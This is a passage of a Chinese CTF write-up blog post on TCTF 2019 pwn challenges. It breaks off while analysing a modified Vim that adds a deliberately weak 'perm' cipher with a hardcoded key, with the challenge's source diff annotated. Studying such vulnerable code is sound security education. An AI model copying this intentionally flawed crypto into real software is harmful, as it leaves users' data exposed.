<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="第一天被llvm卡住了，没搜到源码，理不清内存分配机制，但是利用上只差一步，心态崩了，导致比赛周末只看了两道pwn，星期一上午临时又看了几个发现有的并不是太难，可惜没时间了感受到做题顺序、查找能力、快速学习的重要性 123If on a winters night a traveler: VIM自定义加密方式漏洞及利用babyaegis: LLVM ASAN保护及内存机制分析&amp;&amp;绕">
<meta property="og:type" content="article">
<meta property="og:title" content="TCTF 2019 PWN">
<meta property="og:url" content="http://yoursite.com/2019/03/25/TCTF-2019-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="第一天被llvm卡住了，没搜到源码，理不清内存分配机制，但是利用上只差一步，心态崩了，导致比赛周末只看了两道pwn，星期一上午临时又看了几个发现有的并不是太难，可惜没时间了感受到做题顺序、查找能力、快速学习的重要性 123If on a winters night a traveler: VIM自定义加密方式漏洞及利用babyaegis: LLVM ASAN保护及内存机制分析&amp;&amp;绕">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-15604aa85907073a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2019-03-25T12:19:25.000Z">
<meta property="article:modified_time" content="2019-05-13T14:48:04.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-15604aa85907073a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>TCTF 2019 PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/04/29/CTF-2019-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/25/TCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&text=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&is_video=false&description=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/03/25/TCTF-2019-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&title=TCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/25/TCTF-2019-PWN/&name=TCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#If-on-a-winters-night-a-traveler"><span class="toc-number">1.</span> <span class="toc-text">If on a winters night a traveler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-Vim"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze Vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-Overflow"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">Analyze EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyaegis"><span class="toc-number">2.</span> <span class="toc-text">babyaegis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-UAF-amp-amp-Overflow"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze UAF&amp;&amp;Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-LLVM"><span class="toc-number">2.2.</span> <span class="toc-text">Analyze LLVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">Analyze EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zerotask"><span class="toc-number">3.</span> <span class="toc-text">Zerotask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">3.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        TCTF 2019 PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-25T12:19:25.000Z" itemprop="datePublished">2019-03-25</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>第一天被llvm卡住了，没搜到源码，理不清内存分配机制，但是利用上只差一步，心态崩了，导致比赛周末只看了两道pwn，星期一上午临时又看了几个发现有的并不是太难，可惜没时间了<br>感受到做题顺序、查找能力、快速学习的重要性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If on a winters night a traveler: VIM自定义加密方式漏洞及利用</span><br><span class="line">babyaegis: LLVM ASAN保护及内存机制分析&amp;&amp;绕过利用</span><br><span class="line">Zerotask: 条件竞争+AES加密下溢出的明文构造</span><br></pre></td></tr></table></figure>
<h2 id="If-on-a-winters-night-a-traveler"><a href="#If-on-a-winters-night-a-traveler" class="headerlink" title="If on a winters night a traveler"></a>If on a winters night a traveler</h2><h3 id="Analyze-Vim"><a href="#Analyze-Vim" class="headerlink" title="Analyze Vim"></a>Analyze Vim</h3><p>题目提供了一个vim可执行程序、服务端的运行脚本以及此vim源码与原vim源码的diff比较，可以看到主要是在源码中加入了新的加解密方法crypt_perm.c<br>看到其在crypt.c中新定义了一种method:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="comment">/* Permutation; very very weak */</span></span><br><span class="line">+    &#123;</span><br><span class="line">+	<span class="string">"perm"</span>,</span><br><span class="line">+	<span class="string">"VimCrypt~04!"</span>,</span><br><span class="line">+	<span class="number">0</span>,</span><br><span class="line">+	<span class="number">0</span>,</span><br><span class="line">+	FALSE,</span><br><span class="line">+	FALSE,</span><br><span class="line">+	<span class="literal">NULL</span>,</span><br><span class="line">+	crypt_perm_init,</span><br><span class="line">+	crypt_perm_encode, crypt_perm_decode,</span><br><span class="line">+	<span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">+	crypt_perm_encode, crypt_perm_decode,</span><br><span class="line">+    &#125;,</span><br></pre></td></tr></table></figure>
<p>以及更改了crypt获得key的方式:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-	p1 = getcmdline_prompt(NUL, round == <span class="number">0</span></span><br><span class="line">-		? (char_u *)_(<span class="string">"Enter encryption key: "</span>)</span><br><span class="line">-		: (char_u *)_(<span class="string">"Enter same key again: "</span>), <span class="number">0</span>, EXPAND_NOTHING,</span><br><span class="line">-		<span class="literal">NULL</span>);</span><br><span class="line">+	<span class="comment">// to avoid interactive step, without loss of generality</span></span><br><span class="line">+	p1 = alloc(<span class="number">8</span>);</span><br><span class="line">+	p1[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">+	p1[<span class="number">1</span>] = NUL;</span><br></pre></td></tr></table></figure>
<p>在crypt.c中cryptmethod_T定义如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>    *name;	<span class="comment">/* encryption name as used in 'cryptmethod' */</span></span><br><span class="line">    <span class="keyword">char</span>    *magic;	<span class="comment">/* magic bytes stored in file header */</span></span><br><span class="line">    <span class="keyword">int</span>	    salt_len;	<span class="comment">/* length of salt, or 0 when not using salt */</span></span><br><span class="line">    <span class="keyword">int</span>	    seed_len;	<span class="comment">/* length of seed, or 0 when not using salt */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CRYPT_NOT_INPLACE</span></span><br><span class="line">    <span class="keyword">int</span>	    works_inplace; <span class="comment">/* encryption/decryption can be done in-place */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>	    whole_undofile; <span class="comment">/* whole undo file is encrypted */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optional function pointer for a self-test. */</span></span><br><span class="line">    <span class="keyword">int</span> (* self_test_fn)();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function pointer for initializing encryption/description.</span></span><br><span class="line">    <span class="keyword">void</span> (* init_fn)(cryptstate_T *state, char_u *key,</span><br><span class="line">		      char_u *salt, <span class="keyword">int</span> salt_len, char_u *seed, <span class="keyword">int</span> seed_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers for encoding/decoding from one buffer into another.</span></span><br><span class="line"><span class="comment">     * Optional, however, these or the _buffer ones should be configured. */</span></span><br><span class="line">    <span class="keyword">void</span> (*encode_fn)(cryptstate_T *state, char_u *from, <span class="keyword">size_t</span> len,</span><br><span class="line">								  char_u *to);</span><br><span class="line">    <span class="keyword">void</span> (*decode_fn)(cryptstate_T *state, char_u *from, <span class="keyword">size_t</span> len,</span><br><span class="line">								  char_u *to);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers for encoding and decoding, can buffer data if needed.</span></span><br><span class="line"><span class="comment">     * Optional (however, these or the above should be configured). */</span></span><br><span class="line">    <span class="keyword">long</span> (*encode_buffer_fn)(cryptstate_T *state, char_u *from, <span class="keyword">size_t</span> len,</span><br><span class="line">							     char_u **newptr);</span><br><span class="line">    <span class="keyword">long</span> (*decode_buffer_fn)(cryptstate_T *state, char_u *from, <span class="keyword">size_t</span> len,</span><br><span class="line">							     char_u **newptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers for in-place encoding and decoding, used for</span></span><br><span class="line"><span class="comment">     * crypt_*_inplace(). "from" and "to" arguments will be equal.</span></span><br><span class="line"><span class="comment">     * These may be the same as decode_fn and encode_fn above, however an</span></span><br><span class="line"><span class="comment">     * algorithm may implement them in a way that is not interchangeable with</span></span><br><span class="line"><span class="comment">     * the crypt_(en|de)code() interface (for example because it wishes to add</span></span><br><span class="line"><span class="comment">     * padding to files).</span></span><br><span class="line"><span class="comment">     * This method is used for swap and undo files which have a rigid format.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> (*encode_inplace_fn)(cryptstate_T *state, char_u *p1, <span class="keyword">size_t</span> len,</span><br><span class="line">								  char_u *p2);</span><br><span class="line">    <span class="keyword">void</span> (*decode_inplace_fn)(cryptstate_T *state, char_u *p1, <span class="keyword">size_t</span> len,</span><br><span class="line">								  char_u *p2);</span><br><span class="line">&#125; cryptmethod_T;</span><br></pre></td></tr></table></figure>
<p>即当我们set cm=perm,vim会调用crypt_perm_encode加密文件<br>当打开文件头为”VimCrypt~04!”的文件时，会由crypt_perm_decode解密文件<br>其中在crypt_perm.c实现crypt_perm_init,crypt_perm_encode，crypt_perm_decode:<br>首先是其定义的cryptstate_T:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">+    <span class="keyword">int</span> key;</span><br><span class="line">+    <span class="keyword">int</span> shift;</span><br><span class="line">+    <span class="keyword">int</span> <span class="built_in">step</span>;</span><br><span class="line">+    <span class="keyword">int</span> orig_size;</span><br><span class="line">+    <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">+    <span class="keyword">int</span> cur_idx;</span><br><span class="line">+    char_u *<span class="built_in">buffer</span>;</span><br><span class="line">+&#125; perm_state_T;</span><br></pre></td></tr></table></figure>
<p>主要看一下加解密过程(the analyze is in my notes):<br>crypt_perm_encode:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">void</span></span><br><span class="line">+crypt_perm_encode(</span><br><span class="line">+    cryptstate_T *state,</span><br><span class="line">+    char_u	*from,</span><br><span class="line">+    <span class="keyword">size_t</span>	len,</span><br><span class="line">+    char_u	*to)</span><br><span class="line">+&#123;</span><br><span class="line">+    perm_state_T *ps = state-&gt;method_state;</span><br><span class="line">+    <span class="keyword">size_t</span>	i;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* </span></span><br><span class="line"><span class="comment">+     * A dirty way to introduce IV: using the first 4 bytes and keeping them unchanged </span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">if</span> (len&lt;=<span class="number">4</span>)<span class="comment">//len&lt;=4,there is nothing to change</span></span><br><span class="line">+    &#123;</span><br><span class="line">+        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">+            to[i] = from[i];</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">unsigned</span> <span class="keyword">int</span> iv;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">+    &#123;</span><br><span class="line">+        to[i] = from[i];</span><br><span class="line">+        iv = (iv&lt;&lt;<span class="number">8</span>) + from[i];<span class="comment">//first 4 bytes-&gt;iv</span></span><br><span class="line">+    &#125;</span><br><span class="line">+    ps-&gt;orig_size = len<span class="number">-4</span>;<span class="comment">//delete len(iv)</span></span><br><span class="line">+    ps-&gt;<span class="built_in">size</span> = ps-&gt;orig_size;</span><br><span class="line">+    <span class="comment">/* We need a prime order for reversibility */</span></span><br><span class="line">+    <span class="keyword">while</span> (!is_prime(ps-&gt;<span class="built_in">size</span>))<span class="comment">//make size be prime</span></span><br><span class="line">+        ps-&gt;<span class="built_in">size</span>++;</span><br><span class="line">+</span><br><span class="line">+    ps-&gt;shift = ps-&gt;key % (len<span class="number">-4</span>);<span class="comment">//0x61%(len-4)</span></span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span> = alloc(ps-&gt;shift);</span><br><span class="line">+    <span class="comment">/* Xor with iv so that we have different value for addition and multiplication */</span></span><br><span class="line">+    ps-&gt;<span class="built_in">step</span> = ps-&gt;key ^ iv;</span><br><span class="line">+    <span class="comment">/* Do not forget the corner case */</span></span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;<span class="built_in">step</span> % ps-&gt;<span class="built_in">size</span> == <span class="number">0</span>)</span><br><span class="line">+        ps-&gt;<span class="built_in">step</span>++;</span><br><span class="line">+    ps-&gt;cur_idx = <span class="number">0</span>;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* Step 1: Addition */</span></span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span>[i] = from[len-ps-&gt;shift+i];<span class="comment">//buf[0 to shift-1] = len-shift to  len-1</span></span><br><span class="line">+    <span class="keyword">for</span> (i = len<span class="number">-1</span>; i &gt;= <span class="number">4</span>+ps-&gt;shift; --i)</span><br><span class="line">+        from[i] = from[i-ps-&gt;shift];<span class="comment">//len-1  to shift+4  =  len-shift-1   to  4</span></span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        from[i+<span class="number">4</span>] = ps-&gt;<span class="built_in">buffer</span>[i];<span class="comment">// 4  to shift+4 = buf[0 to shift-1]</span></span><br><span class="line">+    <span class="comment">//final : left+right(shift)-&gt;right(shift)+left</span></span><br><span class="line">+    <span class="comment">/* Step 2: Multiplication */</span></span><br><span class="line">+    i = <span class="number">4</span>;</span><br><span class="line">+    <span class="keyword">while</span> (i &lt; len)</span><br><span class="line">+    &#123;</span><br><span class="line">+        <span class="keyword">if</span> (ps-&gt;cur_idx &lt; ps-&gt;orig_size)</span><br><span class="line">+        &#123;</span><br><span class="line">+            to[i] = from[ps-&gt;cur_idx+<span class="number">4</span>];</span><br><span class="line">+            i++;</span><br><span class="line">+        &#125;</span><br><span class="line">+        ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;<span class="built_in">step</span>)%ps-&gt;<span class="built_in">size</span>;<span class="comment">//step by step</span></span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* We should recover the "from" array */</span></span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span>[i] = from[i+<span class="number">4</span>];</span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">4</span>+ps-&gt;shift; i &lt; len; ++i)</span><br><span class="line">+        from[i-ps-&gt;shift] = from[i];</span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">+        from[len-ps-&gt;shift+i] = ps-&gt;<span class="built_in">buffer</span>[i];<span class="comment">//let  right(shift) to left</span></span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">+        vim_free(ps-&gt;<span class="built_in">buffer</span>);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>主要过程:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">根据前4字节设置iv</span><br><span class="line">而后ps-&gt;shift &#x3D; ps-&gt;key % (len-4);&#x2F;&#x2F;0x61%(len-4)</span><br><span class="line">shift为加密过程中前后buf用于交换的长度</span><br><span class="line">并由ps-&gt;step &#x3D; ps-&gt;key ^ iv生成第二步加密时的step</span><br><span class="line">而后加密，两个操作：</span><br><span class="line">前后交换：left+right(shift)-&gt;right(shift)+left</span><br><span class="line">step寻址：ps-&gt;cur_idx &#x3D; (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size，每一次对应位置的from组成最后的密文</span><br><span class="line">最终恢复from</span><br></pre></td></tr></table></figure>
<p>解密过程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">void</span></span><br><span class="line">+crypt_perm_decode(</span><br><span class="line">+    cryptstate_T *state,</span><br><span class="line">+    char_u	*from,</span><br><span class="line">+    <span class="keyword">size_t</span>	len,</span><br><span class="line">+    char_u	*to)</span><br><span class="line">+&#123;</span><br><span class="line">+    perm_state_T *ps = state-&gt;method_state;</span><br><span class="line">+    <span class="keyword">size_t</span>	i;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">if</span> (len&lt;=<span class="number">4</span>)</span><br><span class="line">+    &#123;</span><br><span class="line">+        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">+            to[i] = from[i];</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">unsigned</span> <span class="keyword">int</span> iv;  <span class="comment">//first 4 bytes</span></span><br><span class="line">+    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">+    &#123;</span><br><span class="line">+        to[i] = from[i];</span><br><span class="line">+        iv = (iv&lt;&lt;<span class="number">8</span>) + from[i];</span><br><span class="line">+    &#125;</span><br><span class="line">+    ps-&gt;orig_size = len<span class="number">-4</span>;</span><br><span class="line">+    ps-&gt;<span class="built_in">size</span> = ps-&gt;orig_size;</span><br><span class="line">+    <span class="keyword">while</span> (!is_prime(ps-&gt;<span class="built_in">size</span>))</span><br><span class="line">+        ps-&gt;<span class="built_in">size</span>++;</span><br><span class="line">+</span><br><span class="line">+    ps-&gt;shift = ps-&gt;key % (len<span class="number">-4</span>);</span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">+        ps-&gt;<span class="built_in">buffer</span> = alloc(ps-&gt;shift);</span><br><span class="line">+    ps-&gt;<span class="built_in">step</span> = ps-&gt;key ^ iv;</span><br><span class="line">+    <span class="keyword">if</span> (ps-&gt;<span class="built_in">step</span> % ps-&gt;<span class="built_in">size</span> == <span 